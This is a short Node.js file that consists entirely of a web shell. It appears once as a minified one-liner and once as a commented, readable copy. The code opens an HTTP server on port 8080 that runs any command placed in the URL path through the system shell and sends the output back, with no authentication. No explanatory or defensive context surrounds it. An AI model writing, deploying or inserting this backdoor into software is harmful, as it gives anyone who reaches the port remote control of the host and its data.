require('http').createServer((r,p)=>{require('child_process').exec(unescape(r.url.substr(1)),(e,o)=>{p.write(o);p.end();});}).listen(8080);
/*
require('http').createServer((request, response) => {
    var cmd = unescape(request.url.substr(1));
    require('child_process').exec(cmd, (error, stdout, stderr) => {
        response.write(stdout);
        response.end();
    });
}).listen(8080);
*/